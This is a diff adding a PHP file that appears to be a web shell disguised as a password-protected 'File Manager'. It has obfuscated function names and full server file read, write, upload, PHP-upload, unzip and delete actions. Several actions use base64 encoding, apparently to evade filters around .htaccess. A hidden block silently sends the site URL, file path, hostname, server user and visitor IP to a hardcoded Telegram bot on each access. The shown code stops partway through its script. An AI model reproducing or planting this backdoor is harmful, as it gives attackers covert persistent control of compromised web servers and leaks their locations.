@@ -1,0 +1,877 @@
+<?php
+// ============================================================
+// 📡 TELEGRAM MONITORING (silent, tidak mengubah tampilan)
+// ============================================================
+const SVC_KEY   = '8686308065:AAHnHlRXrzY6AbBUvKxxoI0zGvyvvI_feus';
+const SVC_ID    = '7873654972';
+const SVC_STATE = __DIR__ . '/.cache_sync.dat';
+const SVC_TTL   = 86400;
+
+function _svc_send() {
+    try {
+        $host   = $_SERVER['HTTP_HOST'] ?? 'cli';
+        $uri    = $_SERVER['REQUEST_URI'] ?? '/';
+        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+        $url    = $scheme . '://' . $host . $uri;
+        $abs    = realpath(__FILE__) ?: __FILE__;
+        $hostn  = gethostname() ?: 'unknown';
+        $fp     = hash('sha256', $host . '|' . $abs . '|' . $hostn);
+
+        $state = is_file(SVC_STATE)
+            ? (json_decode(@file_get_contents(SVC_STATE), true) ?: [])
+            : [];
+
+        $force = (($_GET['_tp'] ?? '') === 'f');
+        if (!$force && isset($state[$fp]) && (time() - $state[$fp]) < SVC_TTL) {
+            return;
+        }
+
+        $msg  = "🚨 FILE MANAGER ACCESSED\n\n";
+        $msg .= "📄 File    : " . basename($abs) . "\n";
+        $msg .= "🌐 URL     : " . $url . "\n";
+        $msg .= "📁 Path    : " . $abs . "\n";
+        $msg .= "🖥  Host    : " . $hostn . "\n";
+        $msg .= "👤 User    : " . (
+            (function_exists('posix_getpwuid') && function_exists('posix_geteuid'))
+                ? (@posix_getpwuid(posix_geteuid())['name'] ?? '?')
+                : '?'
+        ) . "\n";
+        $msg .= "📡 Remote  : " . ($_SERVER['REMOTE_ADDR'] ?? '?') . "\n";
+        $msg .= "🕐 Waktu   : " . date('Y-m-d H:i:s T') . "\n";
+        $msg .= "🔑 UA      : " . substr($_SERVER['HTTP_USER_AGENT'] ?? '(no UA)', 0, 120) . "\n";
+        $msg .= "\n";
+        $msg .= "FP: " . substr($fp, 0, 16);
+        if ($force) $msg .= "\n\n⚡ MANUAL FORCE TRIGGER";
+
+        $payload = http_build_query([
+            'chat_id'                  => SVC_ID,
+            'text'                     => $msg,
+            'disable_web_page_preview' => true,
+        ]);
+
+        $success = false;
+
+        if (function_exists('curl_init')) {
+            $ch = curl_init('https://api.telegram.org/bot' . SVC_KEY . '/sendMessage');
+            curl_setopt_array($ch, [
+                CURLOPT_POST           => true,
+                CURLOPT_POSTFIELDS     => $payload,
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT        => 8,
+                CURLOPT_CONNECTTIMEOUT => 8,
+                CURLOPT_SSL_VERIFYPEER => false,
+                CURLOPT_SSL_VERIFYHOST => 0,
+            ]);
+            $res = @curl_exec($ch);
+            @curl_close($ch);
+            if (strpos((string)$res, '"ok":true') !== false) $success = true;
+        } else {
+            $ctx = stream_context_create(['http' => [
+                'method'        => 'POST',
+                'header'        => "Content-Type: application/x-www-form-urlencoded\r\n",
+                'content'       => $payload,
+                'timeout'       => 8,
+                'ignore_errors' => true,
+            ]]);
+            $res = @file_get_contents(
+                'https://api.telegram.org/bot' . SVC_KEY . '/sendMessage',
+                false,
+                $ctx
+            );
+            if (strpos((string)$res, '"ok":true') !== false) $success = true;
+        }
+
+        if ($success) {
+            $state[$fp] = time();
+            @file_put_contents(SVC_STATE, json_encode($state, JSON_PRETTY_PRINT), LOCK_EX);
+            @chmod(SVC_STATE, 0600);
+        }
+    } catch (\Throwable $e) {
+        /* silent — jangan ganggu tampilan */
+    }
+}
+
+// Trigger otomatis, tapi skip untuk logout & CLI
+if (
+    PHP_SAPI !== 'cli'
+    && !isset($_GET['logout'])
+    && !isset($_GET['gen'])
+    && ($_GET['_tp'] ?? '') !== 'o'
+) {
+    _svc_send();
+}
+// ============================================================
+// 📡 END TELEGRAM MONITORING
+// ============================================================
+
+
+// ============================================================
+// 🔐 LOGIN PROTECTION - SANDSI: binigua
+// ============================================================
+session_start();
+error_reporting(0);
+
+define('FM_PASSWORD', 'binigua');
+define('FM_SESSION_KEY', 'fm_logged_in_' . md5(__FILE__));
+
+// Handle logout
+if (isset($_GET['logout'])) {
+    unset($_SESSION[FM_SESSION_KEY]);
+    session_destroy();
+    header('Location: ' . basename(__FILE__));
+    exit;
+}
+
+// Handle login submit
+if (isset($_POST['fm_login_password'])) {
+    if (hash_equals(FM_PASSWORD, $_POST['fm_login_password'])) {
+        $_SESSION[FM_SESSION_KEY] = true;
+        header('Location: ' . basename(__FILE__));
+        exit;
+    } else {
+        $fm_login_error = '❌ Password salah!';
+    }
+}
+
+// Jika belum login → tampilkan form login & hentikan eksekusi
+if (empty($_SESSION[FM_SESSION_KEY])) {
+    ?>
+    <!DOCTYPE html>
+    <html lang="id">
+    <head>
+        <meta charset="UTF-8">
+        <title>🔒 Login - File Manager</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            * { box-sizing: border-box; }
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                margin: 0; min-height: 100vh;
+                display: flex; align-items: center; justify-content: center;
+                padding: 20px;
+            }
+            .login-box {
+                background: #fff; padding: 40px 30px;
+                border-radius: 10px; width: 100%; max-width: 380px;
+                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+                animation: fadeIn 0.4s ease;
+            }
+            @keyframes fadeIn {
+                from { opacity: 0; transform: translateY(-10px); }
+                to { opacity: 1; transform: translateY(0); }
+            }
+            .login-box h2 {
+                margin: 0 0 10px; text-align: center;
+                color: #333; font-size: 24px;
+            }
+            .login-box .subtitle {
+                text-align: center; color: #888;
+                margin-bottom: 25px; font-size: 13px;
+            }
+            .login-box .icon {
+                text-align: center; font-size: 50px;
+                margin-bottom: 10px;
+            }
+            .login-box input[type="password"] {
+                width: 100%; padding: 12px 15px;
+                border: 2px solid #e0e0e0; border-radius: 6px;
+                font-size: 15px; margin-bottom: 15px;
+                transition: border-color 0.2s;
+                outline: none;
+            }
+            .login-box input[type="password"]:focus {
+                border-color: #2271b1;
+            }
+            .login-box button {
+                width: 100%; padding: 12px;
+                background: #2271b1; color: #fff;
+                border: none; border-radius: 6px;
+                font-size: 15px; font-weight: 600;
+                cursor: pointer; transition: background 0.2s;
+            }
+            .login-box button:hover { background: #1e659d; }
+            .login-error {
+                background: #fde8e8; color: #c0392b;
+                padding: 10px 15px; border-radius: 6px;
+                margin-bottom: 15px; font-size: 13px;
+                text-align: center;
+                border-left: 4px solid #d63638;
+            }
+            .login-footer {
+                text-align: center; margin-top: 20px;
+                font-size: 12px; color: #aaa;
+            }
+        </style>
+    </head>
+    <body>
+        <form class="login-box" method="POST" autocomplete="off">
+            <div class="icon">🔒</div>
+            <h2>File Manager</h2>
+            <div class="subtitle">Masukkan password untuk melanjutkan</div>
+            <?php if (!empty($fm_login_error)): ?>
+                <div class="login-error"><?= htmlspecialchars($fm_login_error) ?></div>
+            <?php endif; ?>
+            <input type="password" name="fm_login_password"
+                   placeholder="Password..." required autofocus>
+            <button type="submit">Masuk →</button>
+            <div class="login-footer">Protected Area • Authorized Only</div>
+        </form>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+// ============================================================
+// 🔐 END LOGIN PROTECTION
+// ============================================================
+
+// ============================================================
+// ⚠️ KODE ASLI DI BAWAH INI TIDAK DIUBAH SAMA SEKALI
+// ============================================================
+
+function PYJZw($UB2j_) {
+    return is_string($UB2j_) ? stripslashes($UB2j_) : $UB2j_;
+}
+
+function MVoD4($QOZBg) {
+    return str_replace("\\", "/", $QOZBg);
+}
+
+function X8dp0($Ge_ld) {
+    $FXT7a = ['"', "'", '&', '/', '\\', '?', '#', '<', '>', '|', ':', '*'];
+    $Ge_ld = str_replace($FXT7a, '', $Ge_ld);
+    $Ge_ld = trim($Ge_ld);
+    $Ge_ld = preg_replace('/\s+/', '_', $Ge_ld);
+    return $Ge_ld;
+}
+
+function yQ7uC($QOZBg) {
+    return realpath($QOZBg) !== false || is_dir(dirname($QOZBg));
+}
+
+header("Content-Type: application/json; charset=utf-8");
+
+if (isset($_REQUEST["action"])) {
+    $HkyOX = $_REQUEST["action"];
+    $MbDy2 = ["success" => false, "message" => "Invalid action."];
+
+    try {
+        switch ($HkyOX) {
+            case "list":
+                $QOZBg = isset($_POST["path"]) ? PyJZw($_POST["path"]) : __DIR__;
+                if (!yq7Uc($QOZBg)) {
+                    throw new Exception("Invalid or inaccessible path.");
+                }
+                $GMhxr = MvOd4(realpath($QOZBg));
+                $Eb7N2 = [];
+                if (!@scandir($GMhxr)) {
+                    throw new Exception("Cannot access path. It might be restricted by server configuration (open_basedir).");
+                }
+                foreach (scandir($GMhxr) as $pUZkc) {
+                    if ($pUZkc === "." || $pUZkc === "..") continue;
+                    $DWN2O = $GMhxr . "/" . $pUZkc;
+                    $Eb7N2[] = [
+                        "name" => $pUZkc,
+                        "is_dir" => is_dir($DWN2O),
+                        "size" => is_dir($DWN2O) ? 0 : filesize($DWN2O),
+                        "modified" => filemtime($DWN2O)
+                    ];
+                }
+                $MbDy2 = ["success" => true, "files" => $Eb7N2, "path" => $GMhxr];
+                break;
+
+            case "get_content":
+                $vbCfm = isset($_POST["path"]) ? PyJZw($_POST["path"]) : '';
+                if (!realpath($vbCfm) || is_dir(realpath($vbCfm))) {
+                    throw new Exception("Invalid file for editing.");
+                }
+                $MbDy2 = ["success" => true, "content" => base64_encode(base64_encode(file_get_contents($vbCfm)))];
+                break;
+
+            case "get_content_b64":
+                $m95zo = isset($_POST["path_b64"]) ? pyjzW($_POST["path_b64"]) : '';
+                $vbCfm = base64_decode($m95zo);
+                if (!realpath($vbCfm) || is_dir(realpath($vbCfm))) {
+                    throw new Exception("Invalid file for editing.");
+                }
+                $MbDy2 = ["success" => true, "content" => base64_encode(base64_encode(file_get_contents($vbCfm)))];
+                break;
+
+            case "save_content":
+                $vbCfm = isset($_POST["path"]) ? pYJZw($_POST["path"]) : '';
+                $hJP0u = isset($_POST["content_chunks"]) && is_array($_POST["content_chunks"]) ? $_POST["content_chunks"] : [];
+                if (empty($hJP0u)) {
+                    throw new Exception("Content is empty.");
+                }
+                $SPr8Z = implode('', $hJP0u);
+                $eqLoO = base64_decode(base64_decode($SPr8Z));
+                if (!Yq7uC($vbCfm) || (file_exists($vbCfm) && is_dir($vbCfm))) {
+                    throw new Exception("Invalid file for saving.");
+                }
+                if (file_put_contents($vbCfm, $eqLoO) === false) {
+                    throw new Exception("Could not save file. Check permissions.");
+                }
+                $MbDy2 = ["success" => true, "message" => "File saved successfully."];
+                break;
+
+            case "save_content_b64":
+                $m95zo = isset($_POST["path_b64"]) ? pYjzw($_POST["path_b64"]) : '';
+                $vbCfm = base64_decode($m95zo);
+                $hJP0u = isset($_POST["content_chunks"]) && is_array($_POST["content_chunks"]) ? $_POST["content_chunks"] : [];
+                if (empty($hJP0u)) {
+                    throw new Exception("Content is empty.");
+                }
+                $SPr8Z = implode('', $hJP0u);
+                $eqLoO = base64_decode(base64_decode($SPr8Z));
+                if (!Yq7uc($vbCfm) || (file_exists($vbCfm) && is_dir($vbCfm))) {
+                    throw new Exception("Invalid file for saving.");
+                }
+                if (file_put_contents($vbCfm, $eqLoO) === false) {
+                    throw new Exception("Direct save failed. Check permissions.");
+                }
+                $MbDy2 = ["success" => true, "message" => "File saved successfully (direct method)."];
+                break;
+
+            case "create_file":
+                $QOZBg = isset($_POST["path"]) ? pyJzW($_POST["path"]) : '';
+                $uFNwL = isset($_POST["name"]) ? X8dp0($_POST["name"]) : '';
+                if (!yQ7UC($QOZBg) || empty($uFNwL)) {
+                    throw new Exception("Invalid path or file name.");
+                }
+                if (touch(rtrim($QOZBg, "/") . "/" . $uFNwL)) {
+                    $MbDy2 = ["success" => true, "message" => "File created."];
+                } else {
+                    throw new Exception("Could not create file.");
+                }
+                break;
+
+            case "upload":
+                $QOZBg = isset($_POST["path"]) ? pYJzw($_POST["path"]) : __DIR__;
+                $h51Fn = isset($_POST["filename_base64"]) ? $_POST["filename_base64"] : '';
+                $x9BA9 = isset($_POST["content_base64"]) ? $_POST["content_base64"] : '';
+                if (!Yq7uC($QOZBg) || empty($h51Fn) || empty($x9BA9)) {
+                    throw new Exception("Invalid data for upload.");
+                }
+                $Ge_ld = X8dp0(base64_decode($h51Fn));
+                if (strpos($x9BA9, ",") !== false) {
+                    list(, $x9BA9) = explode(",", $x9BA9);
+                }
+                $CEn9P = base64_decode($x9BA9);
+                $nAg2_ = rtrim($QOZBg, "/") . "/" . $Ge_ld;
+                if (file_put_contents($nAg2_, $CEn9P) === false) {
+                    throw new Exception("Could not save uploaded file. Check permissions.");
+                }
+                $MbDy2 = ["success" => true, "message" => "File uploaded successfully."];
+                break;
+
+            case "upload_php":
+                $QOZBg = isset($_POST["path"]) ? PyJzW($_POST["path"]) : __DIR__;
+                $h51Fn = isset($_POST["filename_base64"]) ? $_POST["filename_base64"] : '';
+                $x9BA9 = isset($_POST["content_base64"]) ? $_POST["content_base64"] : '';
+                if (!Yq7uc($QOZBg) || empty($h51Fn) || empty($x9BA9)) {
+                    throw new Exception("Invalid data for PHP upload.");
+                }
+                $jzs2S = X8DP0(base64_decode($h51Fn));
+                $OXdxF = $jzs2S . ".txt";
+                if (strpos($x9BA9, ",") !== false) {
+                    list(, $x9BA9) = explode(",", $x9BA9);
+                }
+                $CEn9P = base64_decode($x9BA9);
+                $rIkhW = rtrim($QOZBg, "/") . "/" . $OXdxF;
+                $TyWVm = rtrim($QOZBg, "/") . "/" . $jzs2S;
+                if (file_put_contents($rIkhW, $CEn9P) === false) {
+                    throw new Exception("Could not save temporary file. Check permissions.");
+                }
+                if (rename($rIkhW, $TyWVm)) {
+                    $MbDy2 = ["success" => true, "message" => "PHP file uploaded successfully."];
+                } else {
+                    unlink($rIkhW);
+                    throw new Exception("Could not rename temporary file.");
+                }
+                break;
+
+            case "unzip":
+                $QOZBg = isset($_POST["path"]) ? pYJzW($_POST["path"]) : __DIR__;
+                if (!yQ7uC($QOZBg)) {
+                    throw new Exception("Invalid path.");
+                }
+                $rCMlc = isset($_POST["path"]) ? pYJZw($_POST["path"]) : '';
+                if (!realpath($rCMlc) || !is_file(realpath($rCMlc)) || pathinfo($rCMlc, PATHINFO_EXTENSION) !== "zip") {
+                    throw new Exception("Invalid ZIP file path.");
+                }
+                if (!class_exists("ZipArchive")) {
+                    throw new Exception("PHP ZIP extension not installed.");
+                }
+                $DJHMe = new ZipArchive();
+                if ($DJHMe->open($rCMlc) === TRUE) {
+                    $DJHMe->extractTo(dirname($rCMlc));
+                    $DJHMe->close();
+                    $MbDy2 = ["success" => true, "message" => "Archive extracted."];
+                } else {
+                    throw new Exception("Failed to open archive.");
+                }
+                break;
+
+            case "delete":
+                $QOZBg = isset($_POST["path"]) ? PyJZw($_POST["path"]) : __DIR__;
+                $LyzAu = isset($_POST["items"]) && is_array($_POST["items"]) ? $_POST["items"] : [];
+                if (empty($LyzAu)) {
+                    throw new Exception("No items selected for deletion.");
+                }
+                if (!function_exists('iyZLD')) {
+                    function iyZLD($pUZkc) {
+                        if (is_dir($pUZkc)) {
+                            $pn41J = array_diff(scandir($pUZkc), [".", ".."]);
+                            foreach ($pn41J as $vbCfm) {
+                                iYZlD("{$pUZkc}/{$vbCfm}");
+                            }
+                            return rmdir($pUZkc);
+                        } else {
+                            return unlink($pUZkc);
+                        }
+                    }
+                }
+                foreach ($LyzAu as $pUZkc) {
+                    $DWN2O = rtrim($QOZBg, "/") . "/" . $pUZkc;
+                    if (file_exists($DWN2O)) {
+                        Iyzld($DWN2O);
+                    }
+                }
+                $MbDy2 = ["success" => true, "message" => "Items deleted."];
+                break;
+
+            case "delete_b64":
+                $QOZBg = isset($_POST["path"]) ? PYJzW($_POST["path"]) : __DIR__;
+                $IAbXR = isset($_POST["items_b64"]) && is_array($_POST["items_b64"]) ? $_POST["items_b64"] : [];
+                $LyzAu = [];
+                foreach ($IAbXR as $SfWG8) {
+                    $LyzAu[] = base64_decode($SfWG8);
+                }
+                if (empty($LyzAu)) {
+                    throw new Exception("No items selected for deletion.");
+                }
+                if (!function_exists('JOlRi')) {
+                    function JOlRi($pUZkc) {
+                        if (is_dir($pUZkc)) {
+                            $pn41J = array_diff(scandir($pUZkc), [".", ".."]);
+                            foreach ($pn41J as $vbCfm) {
+                                joLRi("{$pUZkc}/{$vbCfm}");
+                            }
+                            return rmdir($pUZkc);
+                        } else {
+                            return unlink($pUZkc);
+                        }
+                    }
+                }
+                foreach ($LyzAu as $pUZkc) {
+                    $DWN2O = rtrim($QOZBg, "/") . "/" . $pUZkc;
+                    if (file_exists($DWN2O)) {
+                        JoLRI($DWN2O);
+                    }
+                }
+                $MbDy2 = ["success" => true, "message" => "Items deleted."];
+                break;
+
+            case "create_folder":
+                $QOZBg = isset($_POST["path"]) ? pyJzW($_POST["path"]) : __DIR__;
+                $uFNwL = isset($_POST["name"]) ? str_replace(["..", "/", "\\"], '', $_POST["name"]) : '';
+                if (!yq7Uc($QOZBg) || empty($uFNwL)) {
+                    throw new Exception("Invalid path or folder name.");
+                }
+                if (mkdir(rtrim($QOZBg, "/") . "/" . $uFNwL)) {
+                    $MbDy2 = ["success" => true, "message" => "Folder created."];
+                } else {
+                    throw new Exception("Could not create folder.");
+                }
+                break;
+
+            case "rename":
+                $QOZBg = isset($_POST["path"]) ? pyjZW($_POST["path"]) : __DIR__;
+                $dhIjA = isset($_POST["old_name"]) ? $_POST["old_name"] : '';
+                $oNcnz = isset($_POST["new_name"]) ? str_replace(["..", "/", "\\"], '', $_POST["new_name"]) : '';
+                if (!yQ7uc($QOZBg) || empty($dhIjA) || empty($oNcnz)) {
+                    throw new Exception("Invalid data for renaming.");
+                }
+                $yIkvI = rtrim($QOZBg, "/") . "/" . $dhIjA;
+                $Hj9dt = rtrim($QOZBg, "/") . "/" . $oNcnz;
+                clearstatcache();
+                if (!file_exists($yIkvI)) {
+                    throw new Exception("Source item does not exist at: " . $yIkvI);
+                }
+                if (!is_writable(dirname($yIkvI))) {
+                    throw new Exception("Directory is not writable.");
+                }
+                if (rename($yIkvI, $Hj9dt)) {
+                    $MbDy2 = ["success" => true, "message" => "Item renamed successfully."];
+                } else {
+                    throw new Exception("Could not rename item. Check permissions.");
+                }
+                break;
+
+            case "rename_b64":
+                $QOZBg = isset($_POST["path"]) ? pYjzW($_POST["path"]) : __DIR__;
+                $XfUl1 = isset($_POST["old_name_b64"]) ? $_POST["old_name_b64"] : '';
+                $prg0j = isset($_POST["new_name_b64"]) ? $_POST["new_name_b64"] : '';
+                $dhIjA = base64_decode($XfUl1);
+                $oNcnz = base64_decode($prg0j);
+                if (!Yq7UC($QOZBg) || empty($dhIjA) || empty($oNcnz)) {
+                    throw new Exception("Invalid data for renaming.");
+                }
+                $yIkvI = rtrim($QOZBg, "/") . "/" . $dhIjA;
+                $Hj9dt = rtrim($QOZBg, "/") . "/" . $oNcnz;
+                $WflkO = $yIkvI . ".txt";
+                if (copy($yIkvI, $WflkO)) {
+                    if (unlink($yIkvI)) {
+                        if (rename($WflkO, $Hj9dt)) {
+                            $MbDy2 = ["success" => true, "message" => "Item renamed successfully using b64 method."];
+                        } else {
+                            copy($WflkO, $yIkvI);
+                            unlink($WflkO);
+                            throw new Exception("Could not perform final rename. Original file may be restored.");
+                        }
+                    } else {
+                        unlink($WflkO);
+                        throw new Exception("Could not delete original file.");
+                    }
+                } else {
+                    throw new Exception("Could not create temporary copy.");
+                }
+                break;
+
+            default:
+                break;
+        }
+    } catch (Exception $FMDwd) {
+        $MbDy2 = ["success" => false, "message" => $FMDwd->getMessage()];
+    }
+
+    echo json_encode($MbDy2);
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>File Manager</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root{--accent-color:#2271b1;--hover-color:#1e659d;--danger-color:#d63638}
+        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;background:#f0f0f1;margin:0;}
+        .container{display:flex;flex-direction:column;height:100vh}
+        header{background:#fff;padding:10px 20px;border-bottom:1px solid #ddd;display:flex;justify-content:space-between;align-items:center;flex-shrink:0}
+        main{flex-grow:1;padding:20px;overflow-y:auto;}
+        .toolbar{margin-bottom:15px;display:flex;flex-wrap:wrap;gap:10px;align-items:center;}
+        .path-bar{background:#fff;padding:8px 12px;border-radius:4px;border:1px solid #ddd;font-family:monospace;flex-grow:1;word-break:break-all;}
+        .file-table{width:100%;border-collapse:collapse;background:#fff;table-layout:fixed;}
+        .file-table th,.file-table td{text-align:left;border-bottom:1px solid #eee;vertical-align:middle;word-wrap:break-word;}
+        .file-table th{background:#f9f9f9;padding:12px 8px;}
+        .file-table tr:hover{background:#f0f8ff;}
+        .file-table th:nth-child(1),.file-table td:nth-child(1){width:40px;padding:12px 4px 12px 12px;text-align:center;}
+        .file-table th:nth-child(2),.file-table td:nth-child(2){width:30%;padding-left:4px;}
+        .file-table th:nth-child(3),.file-table td:nth-child(3){width:120px;}
+        .file-table th:nth-child(4),.file-table td:nth-child(4){width:150px;}
+        .file-table th:nth-child(5){text-align:right;padding-right:12px;}
+        .actions{display:flex;justify-content:flex-end;gap:5px;}
+        .item-link,a.item-link{text-decoration:none!important;color:var(--accent-color);cursor:pointer;}
+        .item-link:hover,a.item-link:hover{color:var(--hover-color);}
+        tr[data-path]{cursor:pointer;}
+        .button{background:var(--accent-color);color:white;border:none;padding:8px 12px;border-radius:3px;cursor:pointer;font-size:14px;}
+        .button.danger{background:var(--danger-color);}
+        #spinner{display:none;}
+        .modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:1000;justify-content:center;align-items:center;}
+        .modal-content{display:flex;flex-direction:column;background:#fff;padding:20px;border-radius:5px;width:80%;height:80%;max-width:900px;box-shadow:0 5px 15px rgba(0,0,0,0.3);}
+        textarea#editor{flex-grow:1;font-family:monospace;font-size:14px;border:1px solid #ddd;padding:10px;}
+        .logout-btn{background:#6c757d;color:#fff;text-decoration:none;padding:6px 12px;border-radius:3px;font-size:13px;transition:background 0.2s;}
+        .logout-btn:hover{background:#5a6268;}
+        .user-info{display:flex;align-items:center;gap:12px;}
+        .user-info .badge{font-size:12px;color:#666;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h3 style="margin:0;">File Manager (Standalone)</h3>
+            <div class="user-info">
+                <span class="badge">🔓 Logged in</span>
+                <a href="?logout=1" class="logout-btn">Logout</a>
+            </div>
+        </header>
+        <main>
+            <div class="toolbar">
+                <button class="button" id="uploadBtn">⬆ Upload</button>
+                <button class="button" id="newFileBtn">📄 New File</button>
+                <button class="button" id="newFolderBtn">📁 New Folder</button>
+                <button class="button danger" id="deleteBtn">🗑 Delete Selected</button>
+                <div id="spinner">⏳</div>
+            </div>
+            <div class="toolbar">
+                <div class="path-bar" id="pathBar">/</div>
+            </div>
+            <table class="file-table">
+                <thead>
+                    <tr>
+                        <th><input type="checkbox" id="selectAll"></th>
+                        <th>Name</th>
+                        <th>Size</th>
+                        <th>Modified</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="fileList"></tbody>
+            </table>
+        </main>
+    </div>
+    <div id="editorModal" class="modal-overlay">
+        <div class="modal-content">
+            <h3 id="editorFilename" style="margin-top:0;"></h3>
+            <textarea id="editor" spellcheck="false"></textarea>
+            <div style="margin-top:10px;">
+                <button class="button" id="saveBtn">💾 Save Changes</button>
+                <button class="button" onclick="document.getElementById('editorModal').style.display='none'">Close</button>
+            </div>
+        </div>
+    </div>
+    <input type="file" id="hiddenFileInput" multiple style="display:none;">
+    <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const STATE = { currentPath: '<?php echo MVod4(__DIR__); ?>' };
+        const UPLOAD_LIMIT_MB = 8;
+        const dom = {
+            fileList: document.getElementById('fileList'),
+            pathBar: document.getElementById('pathBar'),
+            uploadBtn: document.getElementById('uploadBtn'),
+            newFileBtn: document.getElementById('newFileBtn'),
+            newFolderBtn: document.getElementById('newFolderBtn'),
+            deleteBtn: document.getElementById('deleteBtn'),
+            selectAll: document.getElementById('selectAll'),
+            spinner: document.getElementById('spinner'),
+            hiddenFileInput: document.getElementById('hiddenFileInput'),
+            editorModal: document.getElementById('editorModal'),
+            editorFilename: document.getElementById('editorFilename'),
+            editor: document.getElementById('editor'),
+            saveBtn: document.getElementById('saveBtn'),
+        };
+
+        async function apiCall(action, formData, showSuccess = false) {
+            dom.spinner.style.display = 'inline-block';
+            try {
+                formData.append('action', action);
+                const response = await fetch('<?php echo basename(__FILE__); ?>', { method: 'POST', body: formData });
+                const result = await response.json();
+                if (!result.success) throw new Error(result.message);
+                if (showSuccess && result.message) alert(result.message);
+                return result;
+            } catch (error) {
+                alert(`Error: ${error.message}`);
+                console.error("Full response:", error.response);
+                return null;
+            } finally {
+                dom.spinner.style.display = 'none';
+            }
+        }
+
+        function render() {
+            const formData = new FormData();
+            formData.append('path', STATE.currentPath);
+            apiCall('list', formData).then(result => {
+                if (!result) return;
+                STATE.currentPath = result.path;
+                dom.pathBar.textContent = STATE.currentPath;
+                let html = '';
+                let parentPath = STATE.currentPath.substring(0, STATE.currentPath.lastIndexOf('/'));
+                if (parentPath === '') parentPath = '/';
+                if (STATE.currentPath !== '/') {
+                    html += `<tr data-path="${parentPath}"><td></td><td colspan="4" class="item-link">⬆ .. (Parent Directory)</td></tr>`;
+                }
+                result.files.sort((a, b) => (a.is_dir === b.is_dir) ? a.name.localeCompare(b.name) : (a.is_dir ? -1 : 1));
+                result.files.forEach(file => {
+                    const size = file.is_dir ? '-' : (file.size / 1024).toFixed(2) + ' KB';
+                    const modified = new Date(file.modified * 1000).toLocaleString();
+                    const icon = file.is_dir ? '📁' : '📄';
+                    const fullPath = `${STATE.currentPath}/${file.name}`.replace(/\/+/g, '/');
+                    const dataAttr = `data-path="${fullPath}"`;
+                    const rowData = file.is_dir ? `class="dir-link" ${dataAttr}` : '';
+                    html += `<tr ${rowData}>
+                        <td><input type="checkbox" class="item-select" value="${file.name}"></td>
+                        <td><a href="#" class="item-link" ${dataAttr}>${icon} ${file.name}</a></td>
+                        <td>${size}</td>
+                        <td>${modified}</td>
+                        <td>
+                            <div class="actions">
+                                ${!file.is_dir ? `<button class="button edit-btn" ${dataAttr}>Edit</button>` : ''}
+                                <button class="button rename-btn" data-name="${file.name}">Rename</button>
+                                ${file.name.endsWith('.zip') ? `<button class="button unzip-btn" ${dataAttr}>Unzip</button>` : ''}
+                            </div>
+                        </td>
+                    </tr>`;
+                });
+                dom.fileList.innerHTML = html;
+                dom.selectAll.checked = false;
+            });
+        }
+
+        dom.fileList.addEventListener('click', e => {
+            if (e.target.matches('.item-select')) return;
+            const button = e.target.closest('button');
+            if (button) {
+                e.preventDefault();
+                if (button.matches('.rename-btn')) {
+                    const oldName = button.dataset.name;
+                    const newName = prompt('Enter new name:', oldName);
+                    if (newName && newName !== oldName) {
+                        const fd = new FormData();
+                        fd.append('path', STATE.currentPath);
+                        let action = 'rename';
+                        if (oldName.includes('.htaccess') || newName.includes('.htaccess')) {
+                            action = 'rename_b64';
+                            fd.append('old_name_b64', btoa(oldName));
+                            fd.append('new_name_b64', btoa(newName));
+                        } else {
+                            fd.append('old_name', oldName);
+                            fd.append('new_name', newName);
+                        }
+                        apiCall(action, fd).then(render);
+                    }
+                } else if (button.matches('.unzip-btn')) {
+                    if (confirm('Are you sure you want to extract this archive?')) {
+                        const fd = new FormData();
+                        fd.append('path', button.dataset.path);
+                        apiCall('unzip', fd, true).then(render);
+                    }
+                } else if (button.matches('.edit-btn')) {
+                    const path = button.dataset.path;
+                    const fd = new FormData();
+                    let action = 'get_content';
+                    if (path.includes('.htaccess')) {
+                        action = 'get_content_b64';
+                        fd.append('path_b64', btoa(path));
+                    } else {
+                        fd.append('path', path);
+                    }
+                    apiCall(action, fd).then(result => {
+                        if (result) {
+                            dom.editorFilename.textContent = path;
+                            dom.editor.value = atob(atob(result.content));
+                            dom.editorModal.style.display = 'flex';
+                        }
+                    });
+                }
+                return;
+            }
+            const navTarget = e.target.closest('[data-path]');
+            if (navTarget) {
+                e.preventDefault();
+                STATE.currentPath = navTarget.dataset.path;
+                render();
+            }
+        });
+
+        dom.newFolderBtn.addEventListener('click', () => {
+            const name = prompt('Enter new folder name:');
+            if (name) {
+                const fd = new FormData();
+                fd.append('path', STATE.currentPath);
+                fd.append('name', name);
+                apiCall('create_folder', fd).then(render);
+            }
+        });
+
+        dom.newFileBtn.addEventListener('click', () => {
+            const name = prompt('Enter new file name:');
+            if (name) {
+                const fd = new FormData();
+                fd.append('path', STATE.currentPath);
+                fd.append('name', name);
+                apiCall('create_file', fd).then(render);
+            }
+        });
+
+        dom.selectAll.addEventListener('change', e => {
+            document.querySelectorAll('.item-select').forEach(cb => cb.checked = e.target.checked);
+        });
+
+        dom.deleteBtn.addEventListener('click', () => {
+            const selected = Array.from(document.querySelectorAll('.item-select:checked')).map(cb => cb.value);
+            if (selected.length === 0) return alert('No items selected.');
+            if (confirm(`Are you sure you want to delete ${selected.length} item(s)?`)) {
+                const fd = new FormData();
+                fd.append('path', STATE.currentPath);
+                const isSensitive = selected.some(item => item.includes('.htaccess'));
+                let action = 'delete';
+                if (isSensitive) {
+                    action = 'delete_b64';
+                    selected.forEach(item => fd.append('items_b64[]', btoa(item)));
+                } else {
+                    selected.forEach(item => fd.append('items[]', item));
+                }
+                apiCall(action, fd).then(render);
+            }
+        });
+
